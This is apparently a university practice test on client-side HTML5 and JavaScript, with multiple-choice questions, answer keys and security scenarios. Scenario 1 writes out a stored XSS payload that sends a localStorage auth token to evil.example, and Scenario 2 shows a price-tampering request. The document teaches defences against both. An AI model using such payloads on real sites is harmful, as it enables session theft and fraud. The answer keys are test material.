# Module 2 Practice Test: Client-Side Scripting with HTML5 & JavaScript

> [Cybersecurity and Digital Forensics](../../README.md) › [Term 1](../README.md) › [Module 2](README.md) › **Practice Test**

| ⬅ [Last session](session-10-geolocation-and-apis.md) | [Module overview](README.md) ➡ |
|:---|---:|

Answer every question first, then open the hidden answers to check yourself. Aim for 16/20 or better before moving on.

---

## Part A: Multiple-choice questions

**1.** Which part of `https://lab.example.edu/notes.html?week=3#rules` is **not** sent to the server?
A) `/notes.html` B) `week=3` C) `#rules` D) `lab.example.edu`

**2.** What does `<!DOCTYPE html>` tell the browser?
A) The page title B) To render in HTML5 standards mode C) To load JavaScript D) To use HTTPS

**3.** Which element should contain the unique main content of a page?
A) `<section>` B) `<main>` C) `<div>` D) `<article>`

**4.** How do you display the text `<script>` on a page without it being treated as a tag?
A) `<script>` B) `"script"` C) `&lt;script&gt;` D) `<pre><script></pre>`

**5.** A link with `target="_blank"` should also have:
A) `rel="noopener noreferrer"` B) `alt=""` C) `type="link"` D) `id="blank"`

**6.** Which selector has the highest specificity?
A) `div p` B) `.card .title` C) `#summary` D) `ul li a`

**7.** With `box-sizing: border-box`, `width: 300px; padding: 20px; border: 5px` gives a total rendered width of:
A) 350px B) 300px C) 325px D) 250px

**8.** Which CSS layout system is designed for two dimensions (rows **and** columns)?
A) Flexbox B) Float C) Grid D) Inline-block

**9.** Which form method puts the data in the URL?
A) POST B) GET C) PUT D) DELETE

**10.** A form uses `required` and `pattern` on every field. What else is still necessary?
A) Nothing B) Server-side validation of every field C) A `<table>` layout D) `autocomplete="on"`

**11.** In a table, a header cell that labels a whole column should be written as:
A) `<td scope="col">` B) `<th scope="col">` C) `<th colspan="col">` D) `<thead col>`

**12.** A `<video>` element has a WebM `<source>` then an MP4 `<source>`. A browser that supports both plays:
A) The MP4 B) The WebM C) Both D) The fallback text

**13.** What is the value of `"5" + 3` in JavaScript?
A) `8` B) `"53"` C) `NaN` D) `2`

**14.** Which value is **truthy**?
A) `0` B) `""` C) `null` D) `"0"`

**15.** What does `0 ?? 10` evaluate to?
A) `10` B) `0` C) `null` D) `undefined`

**16.** Which is the safest way to show a user's comment on a page?
A) `el.innerHTML = comment` B) `document.write(comment)` C) `el.textContent = comment` D) `eval(comment)`

**17.** `JSON.parse("{name: 'Ali'}")` will:
A) Return an object B) Return a string C) Throw a `SyntaxError` D) Return `null`

**18.** In ES2022, what does the `#` in `#token` inside a class mean?
A) A comment B) A private field C) A CSS id D) A static field

**19.** `localStorage.setItem("visits", 3); typeof localStorage.getItem("visits")` gives:
A) `"number"` B) `"string"` C) `"object"` D) `"undefined"`

**20.** The Geolocation API returns error code 1. What happened?
A) Timeout B) Position unavailable C) Permission denied D) Success

<details>
<summary>✅ Answers to Part A</summary>

| Q | Ans | Q | Ans |
|---|---|---|---|
| 1 | C (the fragment stays in the browser) | 11 | B |
| 2 | B | 12 | B (first supported source wins) |
| 3 | B | 13 | B |
| 4 | C | 14 | D |
| 5 | A | 15 | B (`??` only replaces `null`/`undefined`) |
| 6 | C | 16 | C |
| 7 | B | 17 | C (keys and strings need double quotes) |
| 8 | C | 18 | B |
| 9 | B | 19 | B (Web Storage stores strings) |
| 10 | B | 20 | C |

</details>

## Part B: Scenarios

**Scenario 1: The comment box.** A university club page lets visitors post comments. The code that shows them is:

```js
document.getElementById("comments").innerHTML += "<p>" + comment + "</p>";
```

A visitor posts `<img src=x onerror="fetch('https://evil.example/?c='+localStorage.authToken)">`. Explain what happens, and list three fixes.

<details>
<summary>Model answer</summary>

The comment is inserted as HTML, so the browser creates an `<img>`; the image fails to load and the `onerror` JavaScript runs in every visitor's browser. It reads `authToken` from `localStorage` and sends it to the attacker, who can then impersonate users. This is **stored XSS**.

Fixes:

1. Build the element safely: `const p = document.createElement("p"); p.textContent = comment; list.append(p);` (or escape `& < > " '` on output).
2. Do not keep session tokens in Web Storage; use an `HttpOnly; Secure; SameSite` cookie that scripts cannot read.
3. Add a **Content Security Policy** that blocks inline event handlers and restricts where scripts and requests may go (`script-src 'self'`, `connect-src 'self'`).

Also validate input on the server and keep libraries updated.

</details>

**Scenario 2: The discount that wasn't.** An online lab-kit shop has this form:

```html
<form action="/buy" method="get">
  <input type="hidden" name="price" value="4500">
  <input type="number" name="qty" min="1" max="5" required>
  <button>Buy</button>
</form>
```

A student buys 5 kits for Rs 1 each. How, and what should the developer change?

<details>
<summary>Model answer</summary>

Hidden fields and `min`/`max` limits live in the browser, so the student can edit them in DevTools or send the request directly, e.g. `/buy?price=1&qty=5`. Because the form uses **GET**, the values are also visible in the URL, history and server logs.

Changes:

- Never trust a price from the client: the server looks up the price by product id and calculates the total itself.
- Re-validate `qty` on the server (integer, 1–5) and reject unknown fields.
- Use `method="post"` for actions that change state, served over HTTPS, with an anti-CSRF token.

</details>

**Scenario 3: The check-in app.** A lecturer wants a web page where students tap a button to mark attendance only when they are in the lab. The first version sends the exact latitude and longitude of every student to the server every minute using `watchPosition`, and calls a mapping API with a secret key written in the page's JavaScript. Identify the problems and redesign it.

<details>
<summary>Model answer</summary>

Problems:

- **Over-collection of personal data:** continuous, precise location reveals where students live and go; this breaches data-minimisation principles.
- **Secret API key in front-end code:** anyone can view source and abuse or steal the key.
- `watchPosition` drains battery and keeps tracking after attendance is taken.

Redesign:

- Request location once with `getCurrentPosition`, only after the student taps **Check in**, over HTTPS, with a clear explanation.
- Compute the distance to the lab in the browser (haversine) and send only `{ present: true/false }` plus the student id, or round coordinates to 3 decimal places if the server must verify.
- Handle error codes 1, 2 and 3 with a fallback (e.g. a code shown on the lab screen).
- Move any mapping/API calls to the server, keep the key there, restrict it, and return only the needed result.
- Remember that the browser can be spoofed (fake GPS), so pair location with another factor such as a short-lived code shown in the lab.

</details>

---

<sub>Prepared by **Hamna Zahid Khan**, Junior Lecturer · Cybersecurity and Digital Forensics</sub>
